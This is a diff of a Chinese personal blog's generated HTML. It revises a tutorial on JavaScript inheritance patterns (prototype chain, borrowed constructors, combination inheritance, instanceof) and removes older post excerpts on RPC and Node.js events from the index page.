-              <time title="创建时间：2021-12-17 16:39:31 / 修改时间：17:31:35" itemprop="dateCreated datePublished" datetime="2021-12-17T16:39:31+08:00">2021-12-17</time>
+              <time title="创建时间：2021-12-17 16:39:31" itemprop="dateCreated datePublished" datetime="2021-12-17T16:39:31+08:00">2021-12-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-12 16:43:30" itemprop="dateModified" datetime="2022-01-12T16:43:30+08:00">2022-01-12</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -208,8 +647,12 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.superValue = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为父类添加共有方法</span></span><br><span class="line">SuperClass.prototype.getSuperValue = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.superValue;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.subValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承父类</span></span><br><span class="line">SubClass.prototype = <span class="keyword">new</span> SuperClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为子类添加共有方法</span></span><br><span class="line">SubClass.prototype.getSubValue = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.subValue;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sub_1 = <span class="keyword">new</span> SubClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类实例的属性</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_1.superValue); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类原型对象的方法</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_1.getSuperValue()); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="原型链继承的原理"><a href="#原型链继承的原理" class="headerlink" title="原型链继承的原理"></a>原型链继承的原理</h3><p>首先，父类构造函数的实例拥有父类的实例的属性和方法。此外，这个实例的原型属性 <code>_proto_</code> 指向父类的原型对象，这个实例就能通过原型属性 <em>proto</em> 访问到原型对象上的属性和方法。 然后，把这个实例赋值给子类的原型对象，而子类的原型对象是子类的所有实例所共享的，这样子类就继承了：父类的原型对象上的属性和方法，以及父类实例的属性和方法。这就是原型链继承的原理。</p>
-<h3 id="原型链继承的问题"><a href="#原型链继承的问题" class="headerlink" title="原型链继承的问题"></a>原型链继承的问题</h3><p>注意：由于子类的原型对象被赋值为父类的实例，父类的实例的原型属性指向父类的原型对象，而这个原型对象的 constructor 指向父类的构造函数，所以子类实例的 constructor 指向了父类的构造函数 SuperClass。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子类实例的 constructor</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_1.constructor); <span class="comment">// 指向父类的构造函数 SuperClass 继承原理</span></span><br><span class="line"><span class="string">``</span></span><br><span class="line"></span><br><span class="line">### 判断原型和实例的关系</span><br><span class="line"></span><br><span class="line">通过 <span class="keyword">instanceof</span> 操作符可以检测某个对象是否是某个构造函数的实例，具体来说 <span class="keyword">instanceof</span> 是通过检测对象的原型链上是否有某个构造函数的原型对象。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`js</span></span><br><span class="line"><span class="string">console.log(sub_1 instanceof SubClass); // true</span></span><br><span class="line"><span class="string">console.log(sub_1 instanceof SuperClass); // true</span></span><br><span class="line"><span class="string">console.log(sub_1 instanceof Object); // true</span></span><br><span class="line"><span class="string">console.log(SubClass instanceof SuperClass); // false</span></span><br><span class="line"><span class="string">console.log(SubClass.prototype instanceof SuperClass); // true</span></span><br></pre></td></tr></table></figure>
+<h3 id="原型链继承的问题"><a href="#原型链继承的问题" class="headerlink" title="原型链继承的问题"></a>原型链继承的问题</h3><p>注意：由于子类的原型对象被赋值为父类的实例，父类的实例的原型属性指向父类的原型对象，而这个原型对象的 constructor 指向父类的构造函数，所以子<strong>类实例的 constructor 指向了父类的构造函数 SuperClas</strong>s。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子类实例的 constructor</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_1.constructor); <span class="comment">// 指向父类的构造函数 SuperClass 继承原理</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="判断原型和实例的关系"><a href="#判断原型和实例的关系" class="headerlink" title="判断原型和实例的关系"></a>判断原型和实例的关系</h3><p>通过 instanceof 操作符可以检测某个对象是否是某个构造函数的实例，具体来说<strong>instanceof 是通过检测对象的原型链上是否有某个构造函数的原型对象</strong>。</p>
+<p>例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(sub_1 <span class="keyword">instanceof</span> SubClass); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_1 <span class="keyword">instanceof</span> SuperClass); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_1 <span class="keyword">instanceof</span> <span class="built_in">Object</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(SubClass <span class="keyword">instanceof</span> SuperClass); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(SubClass.prototype <span class="keyword">instanceof</span> SuperClass); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="原型链继承的缺点"><a href="#原型链继承的缺点" class="headerlink" title="原型链继承的缺点"></a>原型链继承的缺点</h3><p>1.引用类型属性共享问题</p>
 <p>我们知道原型链继承是通过把父类的实例赋值给子类是的原型对象实现的，而子类的原型对象中的属性和方法是子类的所有实例所共享的，所以原型对象中的属性是引用类型数据被子类实例所共用。如果子类的某个实例修改个这些引用类型数据，子类的其他实例也会受到影响。</p>
@@ -222,7 +665,7 @@
 <p>例如：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.books = [<span class="string">"html"</span>, <span class="string">"css"</span>, <span class="string">"js"</span>];</span><br><span class="line">  <span class="keyword">this</span>.id = id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 调用父类的构造函数</span></span><br><span class="line">  SuperClass.call(<span class="keyword">this</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sub_1 = <span class="keyword">new</span> SubClass(<span class="number">10</span>),</span><br><span class="line">  sub_2 = <span class="keyword">new</span> SubClass(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sub_2.books); <span class="comment">// ["html", "css", "js"]</span></span><br><span class="line">sub_1.books.push(<span class="string">"设计模式"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sub_2.books); <span class="comment">// ["html", "css", "js"]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sub_1.id); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_2.id); <span class="comment">// 20 借用构造函数继承的问题</span></span><br></pre></td></tr></table></figure>
 
-<p>只能继承父类的实例的属性和方法，不能继承父类原型对象中定义的属性和方法，所以借用构造函数继承也很少单独使用。</p>
+<h3 id="借用构造函数继承的问题"><a href="#借用构造函数继承的问题" class="headerlink" title="借用构造函数继承的问题"></a>借用构造函数继承的问题</h3><p><strong>只能继承父类的实例的属性和方法，不能继承父类原型对象中定义的属性和方法</strong>，所以借用构造函数继承也很少单独使用。</p>
 <h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>组合继承是指把原型链继承和借用构造函数继承结合在一起的继承模式。实现思路是：利用原型链实现对原型属性和方法的继承，通过借用构造函数实现对实例属性的继承。</p>
 <p>例如：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.colors = [<span class="string">"red"</span>, <span class="string">"green"</span>, <span class="string">"blue"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SuperClass.prototype.sayName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 继承实例属性</span></span><br><span class="line">  SuperClass.call(<span class="keyword">this</span>, name); <span class="comment">// 第二次调用父类构造函数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承原型方法</span></span><br><span class="line">SubClass.prototype = <span class="keyword">new</span> SuperClass(); <span class="comment">// 第一次调用父类构造函数</span></span><br><span class="line">SubClass.prototype.constructor = SubClass; <span class="comment">// 修正子类的 constructor</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加子类原型方法</span></span><br><span class="line">SubClass.prototype.sayAge = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sub_1 = <span class="keyword">new</span> SubClass(<span class="string">"wan"</span>, <span class="number">26</span>),</span><br><span class="line">  sub_2 = <span class="keyword">new</span> SubClass(<span class="string">"li"</span>, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">sub_1.colors.push(<span class="string">"black"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sub_1.colors); <span class="comment">// ["red", "green", "blue", "black"]</span></span><br><span class="line"><span class="built_in">console</span>.log(sub_2.colors); <span class="comment">// ["red", "green", "blue"]</span></span><br><span class="line"></span><br><span class="line">sub_1.sayName(); <span class="comment">// wan</span></span><br><span class="line">sub_1.sayAge(); <span class="comment">// 26</span></span><br><span class="line">sub_2.sayName(); <span class="comment">// li</span></span><br><span class="line">sub_2.sayAge(); <span class="comment">// 28</span></span><br></pre></td></tr></table></figure>
@@ -468,7 +911,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-17 16:57:02" itemprop="dateModified" datetime="2021-12-17T16:57:02+08:00">2021-12-17</time>
+                <time title="修改时间：2021-12-17 18:16:48" itemprop="dateModified" datetime="2021-12-17T18:16:48+08:00">2021-12-17</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1025,163 +1468,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/06/08/RPC-%E8%B0%83%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Will Wan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Will's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/08/RPC-%E8%B0%83%E7%94%A8/" class="post-title-link" itemprop="url">RPC 调用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-06-08 17:21:13 / 修改时间：17:38:12" itemprop="dateCreated datePublished" datetime="2021-06-08T17:21:13+08:00">2021-06-08</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/HTTP/" itemprop="url" rel="index"><span itemprop="name">HTTP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="RPC-调用的概念"><a href="#RPC-调用的概念" class="headerlink" title="RPC 调用的概念"></a>RPC 调用的概念</h2><p>RPC 全称：Remote Procedure Call (远程过程调用)。</p>
-<h3 id="和-Ajax-对比"><a href="#和-Ajax-对比" class="headerlink" title="和 Ajax 对比"></a>和 Ajax 对比</h3><p>和Ajax相同点：</p>
-<ul>
-<li>都是两个计算机之间的网络通信</li>
-<li>都需要双方约定一个数据格式</li>
-</ul>
-<p>和Ajax不同点：</p>
-<ul>
-<li>不一定使用DNS作为寻址服务（使用特有服务进行寻址。例如：阿里使用VIP(虚拟IP)）</li>
-<li>应用层协议一般不用HTTP</li>
-<li>基于TCP或UDP</li>
-</ul>
-<h2 id="RPC-调用的通信方式"><a href="#RPC-调用的通信方式" class="headerlink" title="RPC 调用的通信方式"></a>RPC 调用的通信方式</h2><ul>
-<li>单工通信（单向通信，也就是只能一方向另一方发送数据）</li>
-<li>半双工通信（可双向通信，但是同一时段只能单向通信）</li>
-<li>全双工通信（双向通信）</li>
-</ul>
-<h2 id="RPC-调用使用二进制协议"><a href="#RPC-调用使用二进制协议" class="headerlink" title="RPC 调用使用二进制协议"></a>RPC 调用使用二进制协议</h2><p>使用二进制协议的优势：</p>
-<ul>
-<li>更小的数据包体积</li>
-<li>更快的编解码速率</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/06/07/Node-js-%E4%BA%8B%E4%BB%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Will Wan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Will's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/07/Node-js-%E4%BA%8B%E4%BB%B6/" class="post-title-link" itemprop="url">Node.js 事件</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-06-07 10:31:03 / 修改时间：10:34:16" itemprop="dateCreated datePublished" datetime="2021-06-07T10:31:03+08:00">2021-06-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Node-js/" itemprop="url" rel="index"><span itemprop="name">Node.js</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Node-js-事件的基本用法"><a href="#Node-js-事件的基本用法" class="headerlink" title="Node.js 事件的基本用法"></a>Node.js 事件的基本用法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>).EventEmitter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化</span></span><br><span class="line"><span class="keyword">let</span> life = <span class="keyword">new</span> EventEmitter();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> water = <span class="function"><span class="params">who</span> =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`给<span class="subst">$&#123;who&#125;</span>倒水`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听事件</span></span><br><span class="line">life.on(<span class="string">'comfort'</span>, water);</span><br><span class="line"></span><br><span class="line">life.on(<span class="string">'comfort'</span>, who =&gt; &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`给<span class="subst">$&#123;who&#125;</span>按摩`</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发事件</span></span><br><span class="line"><span class="keyword">const</span> hasComfortEventListener = life.emit(<span class="string">'comfort'</span>, <span class="string">'will'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(hasComfortEventListener);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除事件</span></span><br><span class="line">life.removeListener(<span class="string">'comfort'</span>, water); <span class="comment">// 移除单个事件</span></span><br><span class="line">life.removeAllListeners(<span class="string">'comfort'</span>); <span class="comment">// 移除一类事件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听事件的个数</span></span><br><span class="line"><span class="built_in">console</span>.log(life.listeners(<span class="string">'comfort'</span>).length);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置事件监听数的最大值</span></span><br><span class="line">life.setMaxListeners(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1253,20 +1539,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">22</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1293,7 +1579,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
